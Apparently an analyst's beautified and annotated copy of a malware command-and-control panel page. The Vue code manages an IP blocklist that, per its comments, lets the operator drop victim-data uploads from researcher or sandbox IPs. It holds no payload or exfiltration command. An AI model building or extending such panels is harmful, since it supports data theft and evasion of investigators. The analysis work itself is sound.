/*
 * ============================================================================
 * C2 Panel — IP Blacklist Management Page (c2_blacklist_beautified.js)
 * ============================================================================
 * Purpose:
 *   Admin page that lets the operator maintain an IP blocklist used by the C2
 *   backend to reject data uploads ("采集") from victim apps reporting in from
 *   blocked IPs. Operators can add an IPv4, view the current list with reasons
 *   and timestamps, paginate, and remove entries. Useful for the threat actor
 *   to silently drop victim traffic from researchers/sandbox IPs once spotted.
 *
 * Original file: src/views/blacklist/index.vue (bundled by Vite).
 *
 * Imports:
 *   - "./index.BDBJuSBx.js"   shared Vue 3 + Element Plus runtime (mangled).
 *   - "./request.CmoIc_Cu.js"  axios wrapper; `h` here = request fn.
 *
 * Import alias map (notable):
 *   T  -> SFC factory wrapper (scoped style)
 *   S  -> onMounted
 *   I  -> createVNode block (Vue template compiler h()-wrapper)
 *   x  -> createElementVNode
 *   i  -> createVNode (used for raw DOM elements)
 *   t / n -> withCtx (slot factory)
 *   $  -> withKeys (filters keyups — here Enter)
 *   p  -> unref
 *   K  -> Element Plus "Plus" icon (used in toolbar add-btn)
 *   M  -> Element Plus "Refresh" icon
 *   C  -> Element Plus "Connection"/"Link" icon (the IP/blocked icon)
 *   R  -> Element Plus "Delete" icon (used per-row delete button)
 *   U  -> vLoading directive (full-table loading mask)
 *   A  -> vLoading directive target register ("L")
 *   j  -> ElButton
 *   q  -> ElTable
 *   F  -> ElPagination
 *   G  -> ElIcon
 *   Y  -> ElInput  (with prepend slot — the toolbar input)
 *   H  -> ElTableColumn (alias `u`)
 *   J  -> ElPopconfirm (alias `B`) — used for "Are you sure?" on remove
 *   r  -> ref
 *   g  -> ElMessage / notification helper
 *   h  -> axios request fn (from request.CmoIc_Cu.js)
 *   Q  -> render-nothing (comment) helper
 *   O  -> resolveDynamicComponent used to render <component :is="..."/> icons
 *
 * Page layout:
 *   - Header:                  title + description ("IP黑名单管理")
 *   - Toolbar row:             IP input + "添加黑名单" button + "刷新" button
 *                              + total count badge ("共 N 个IP")
 *   - Results table (ElTable): columns ID, IP地址, 拉黑原因, 添加时间, 操作
 *                              with row delete button (popconfirm guarded)
 *   - Pagination wrap (only if total > 20)
 *
 * API endpoints:
 *   GET    /manage/ip-blacklist/list?page=N&limit=20  -> { list, total }
 *   POST   /manage/ip-blacklist/add    { ip }        -> adds new entry
 *   DELETE /manage/ip-blacklist/:id                    -> removes entry
 *
 * Validation:
 *   IPv4 regex ^(\d{1,3}\.){3}\d{1,3}$  — only IPv4 supported, no IPv6, no
 *   range/CIDR or wildcards.
 *
 * Timestamp format:
 *   Server-side created_at is a Unix timestamp in seconds; multiplied by 1000
 *   before being formatted via Date.toLocaleString("zh-CN").
 * ============================================================================
 */

import {
    _ as T,
    o as S,
    b as I,
    g as x,
    f as i,
    d as t,
    w as n,
    y as $,
    u as p,
    a1 as K,
    a2 as M,
    m as s,
    t as f,
    D as U,
    L as A,
    c as O,
    h as Q,
    s as r,
    O as Y,
    p as j,
    P as q,
    Q as F,
    k as G,
    ae as C,
    Y as H,
    af as J,
    a7 as R,
    N as g
} from "./index.BDBJuSBx.js";
import {
    s as h
} from "./request.CmoIc_Cu.js"; /* empty css                        */ /* empty css                 */ /* empty css                   */ /* empty css                      */ /* empty css                  */

// ---- Static class-name attribute objects used by the template ----
const W = {
        class: "blacklist-page"
    },
    X = {
        class: "toolbar"
    },
    Z = {
        class: "total-badge"
    },
    ee = {
        class: "ip-text"
    },
    te = {
        key: 0,
        class: "pagination-wrap"
    },
    // Page size constant — controls both the API `limit` param and the
    // pagination component's page-size. Matches the visible row count.
    P = 20,
    // ---- SFC options object ----
    // __name:"index"  -> original file was views/blacklist/index.vue
    ae = {
        __name: "index",
        setup(ne) {
            // ----- Reactive state -----
            const c = r([]),     // current page blacklist entries (array of rows)
                v = r(!1),        // table loading flag (drives v-loading mask)
                b = r(!1),        // add-button loading flag (in-flight add)
                _ = r(""),        // IP input text binding (toolbar)
                m = r(0),         // total entry count returned by server
                w = r(1);         // current page number (1-based)

            /**
             * fetchList() — load blacklist entries for the current page.
             *
             * Calls /manage/ip-blacklist/list with {page, limit:P}. Server is
             * expected to return either:
             *   { data: { list, total } }   (preferred)
             *   { data: [...], count: N }   (legacy fallback parsed below)
             * On failure the list is cleared to [] and the loading mask
             * disables.
             */
            async function d() {
                var a, e;
                v.value = !0;
                try {
                    const o = await h({
                        url: "/manage/ip-blacklist/list",
                        params: {
                            page: w.value,
                            limit: P
                        }
                    });
                    // Defensive parsing: prefer `data.list`, else fallback
                    // to `data` as the array itself; same for the total.
                    c.value = ((a = o.data) == null ? void 0 : a.list) || o.data || [], m.value = ((e = o.data) == null ? void 0 : e.total) || o.count || c.value.length
                } catch {
                    c.value = []
                }
                v.value = !1
            }

            /**
             * addBlacklist() — validate current input IP and POST it.
             *
             * Validation steps:
             *   1. Non-empty (trimmed).
             *   2. IPv4 shape regex. NOTE: this only checks shape, not octet
             *      ranges — values like "999.999.999.999" pass. Server-side
             *      validation should be assumed to do the range check.
             * On success: clears the input, success toast, refresh list.
             * On failure: warning toast; b flag never set true.
             */
            async function k() {
                const a = _.value.trim();
                if (!a) {
                    g.warning("请输入IP地址");
                    return
                }
                if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(a)) {
                    g.warning("IP格式不正确");
                    return
                }
                b.value = !0;
                try {
                    await h({
                        url: "/manage/ip-blacklist/add",
                        method: "post",
                        data: {
                            ip: a
                        }
                    }), g.success("已添加到黑名单"), _.value = "", d()
                } catch {}
                b.value = !1
            }

            /**
             * removeBlacklist(id) — DELETE a single entry by id, then refresh.
             * Wrapped in try/catch — failures are silent (no toast). The
             * popconfirm in the UI is the only user confirmation.
             */
            async function E(a) {
                try {
                    await h({
                        url: `/manage/ip-blacklist/${a}`,
                        method: "delete"
                    }), g.success("已移除"), d()
                } catch {}
            }

            /**
             * formatTime(unixSeconds) — format a server-side integer Unix
             * timestamp into a localized zh-CN string. Returns "-" for falsy
             * (null/0/undefined) values. Multiplied by 1000 because the pack
             * expects seconds, JS Date expects milliseconds.
             */
            function V(a) {
                return a ? new Date(a * 1e3).toLocaleString("zh-CN") : "-"
            }

            // Trigger initial load on mount.
            return S(d), (a, e) => {
                // Render-time local aliases for Element Plus components.
                const o = G,    // ElIcon
                    N = Y,      // ElInput  (with prepend slot for the IP icon)
                    y = j,      // ElButton
                    u = H,      // ElTableColumn
                    B = J,      // ElPopconfirm (used on the delete button)
                    D = q,      // ElTable
                    z = F,      // ElPagination
                    L = A;      // vLoading directive helper
                return I(), x("div", W, [
                    // ---------------- Page header (title + desc) ----------------
                    e[7] || (e[7] = i("div", {
                        class: "page-header"
                    }, [
                        i("h3", null, "IP黑名单管理"),
                        // ^ "IP Blacklist Management"
                        i("p", {
                            class: "page-desc"
                        }, "被加入黑名单的IP将无法通过APP上传数据")
                        // ^ "IPs added to the blacklist will be unable to
                        //    upload data via the APP"
                    ], -1)),

                    // ---------------- Toolbar row ----------------
                    i("div", X, [
                        // IP input — has a button-prepend slot rendering the
                        // Connection/Link icon (alias C). Enter key triggers add.
                        t(N, {
                            modelValue: _.value,
                            "onUpdate:modelValue": e[0] || (e[0] = l => _.value = l),
                            placeholder: "输入IP地址 (如: 192.168.1.1)",
                            style: {
                                width: "300px"
                            },
                            onKeyup: $(k, ["enter"])
                        }, {
                            prepend: n(() => [t(o, null, {
                                default: n(() => [t(p(C))]), // <component :is="C"/>
                                _: 1
                            })]),
                            _: 1
                        }, 8, ["modelValue"]),
                        // "添加黑名单" (Add to Blacklist) — primary danger action
                        t(y, {
                            type: "danger",
                            icon: p(K),                // Plus icon
                            onClick: k,                 // -> addBlacklist()
                            loading: b.value            // spinner during POST
                        }, {
                            default: n(() => [...e[2] || (e[2] = [s("添加黑名单", -1)])]),
                            _: 1
                        }, 8, ["icon", "loading"]),
                        // "刷新" (Refresh) — manually refetch the list
                        t(y, {
                            icon: p(M),                // Refresh icon
                            onClick: d                  // -> fetchList()
                        }, {
                            default: n(() => [...e[3] || (e[3] = [s("刷新", -1)])]),
                            _: 1
                        }, 8, ["icon"]),
                        // Total count badge: "共 N 个IP" ("N IPs in total")
                        i("span", Z, [
                            e[4] || (e[4] = s("共 ", -1)),
                            i("strong", null, f(m.value), 1),
                            e[5] || (e[5] = s(" 个IP", -1))
                        ])
                    ]),

                    // ---------------- Data table ----------------
                    // Wrap render fn with v-loading directive (alias L) bound
                    // to the table loading state v.value.
                    U((I(), O(D, {
                        data: c.value,
                        stripe: "",
                        border: "",
                        style: {
                            width: "100%"
                        }
                    }, {
                        // Default slot = the column definitions.
                        default: n(() => [
                            // Column: ID (numeric, narrow)
                            t(u, {
                                prop: "id",
                                label: "ID",
                                width: "80"
                            }),
                            // Column: IP地址 — custom cell renders connection
                            // icon + IP text. (Should-have-reason header text.)
                            t(u, {
                                prop: "ip",
                                label: "IP地址",
                                "min-width": "180"
                            }, {
                                default: n(({
                                    row: l
                                }) => [i("span", ee, [t(o, null, {
                                    default: n(() => [t(p(C))]), // prepend icon
                                    _: 1
                                }), s(" " + f(l.ip), 1)])]),
                                _: 1
                            }),
                            // Column: 拉黑原因 ("Reason") — defaults to
                            // "手动添加" (Manually added) when empty.
                            t(u, {
                                prop: "reason",
                                label: "拉黑原因",
                                "min-width": "200"
                            }, {
                                default: n(({
                                    row: l
                                }) => [s(f(l.reason || "手动添加"), 1)]),
                                _: 1
                            }),
                            // Column: 添加时间 ("Added Time") — formats the
                            // server's created_at Unix seconds via formatTime.
                            t(u, {
                                label: "添加时间",
                                width: "180"
                            }, {
                                default: n(({
                                    row: l
                                }) => [s(f(V(l.created_at)), 1)]),
                                _: 1
                            }),
                            // Column: 操作 ("Action") — popconfirm-protected
                            // delete button per row.
                            t(u, {
                                label: "操作",
                                width: "120",
                                align: "center"
                            }, {
                                default: n(({
                                    row: l
                                }) => [
                                    // Popconfirm: "确认移除此IP？" ("Confirm
                                    // remove this IP?")
                                    t(B, {
                                        title: "确认移除此IP？",
                                        onConfirm: le => E(l.id)
                                    }, {
                                        // Reference slot = the trigger button
                                        reference: n(() => [t(y, {
                                            type: "danger",
                                            size: "small",
                                            icon: p(R)            // Delete icon
                                        }, {
                                            default: n(() => [...e[6] || (e[6] = [s("移除", -1)])]),
                                            // ^ "Remove"
                                            _: 1
                                        }, 8, ["icon"])]),
                                        _: 1
                                    }, 8, ["onConfirm"])
                                ]),
                                _: 1
                            })]),
                        _: 1
                    }, 8, ["data"])), [
                        [L, v.value]
                    ]),

                    // ---------------- Pagination (hidden unless many rows) ----
                    m.value > P ? (I(), x("div", te, [t(z, {
                        "current-page": w.value,
                        "onUpdate:currentPage": e[1] || (e[1] = l => w.value = l),
                        "page-size": P,
                        total: m.value,
                        layout: "prev, pager, next",
                        background: "",
                        onCurrentChange: d                  // refetch on page change
                    }, null, 8, ["current-page", "total"])])) : Q("", !0)
                    // ^ render-nothing when total ≤ page size
                ])
            }
        }
    },
    // ---- SFC factory wrap: scoped-style id data-v-07a78a66 ----
    ce = T(ae, [
        ["__scopeId", "data-v-07a78a66"]
    ]);
export {
    ce as
    default
};
